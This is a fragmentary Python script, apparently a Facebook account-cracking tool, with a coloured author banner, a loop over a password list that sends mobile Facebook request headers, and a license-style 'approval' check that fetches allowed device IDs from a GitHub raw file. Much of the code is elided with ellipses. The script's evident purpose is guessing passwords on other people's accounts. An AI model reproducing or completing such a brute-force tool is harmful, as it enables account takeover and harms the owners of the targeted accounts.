...
\033[1;93m┌━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┐
\033[1;37m│ ❲★❳ AUTHOR   : xMon      │ 
\033[1;37m│ ❲★❳ GITHUB   : PRIVATE            |
\033[1;37m│ ❲★❳ WHATSAPP :    PRIVATE 
\033[1;37m│ ❲★❳ TOOLS    : \033[1;32mACTIVE \033[1;37m       │
...
class Main:
    ...
    def __init__(self):
        ...
        #s.system('xdg- open https://t.me/+626cHxTq2f9iYzdl')
    ...
    try:
        ...
        for ps in pwx:
           ...
           headers_freefb = {'authority': 'm.facebook.com',
 		   ...
 		   'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="124.0.6293.200", "Google Chrome";v="124.0.6293.200"',
 		   'sec-ch-ua-mobile': '?0',
...
def approval():
  ...
  id = "4h".join(uuid)
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/arohi999/emonkhanb/main/Approve.txt').text
    if id in httpCaht:
